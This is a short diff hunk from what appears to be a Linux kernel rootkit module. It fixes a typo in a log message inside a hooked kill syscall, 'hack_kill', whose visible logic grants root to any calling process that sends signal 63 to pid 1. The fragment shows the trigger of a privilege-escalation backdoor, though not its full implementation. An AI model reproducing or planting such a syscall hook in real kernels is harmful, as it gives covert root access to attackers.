@@ -27,7 +27,7 @@ static asmlinkage long hack_kill(const struct pt_regs *regs){ // pretty self exp
         return 0;
     }
     else if ((sig == 63) && (pid == 1)){
-        pr_info("Setting root fotr calling process\n");
+        pr_info("Setting root for calling process\n");
         set_root();
         return 0;
     }
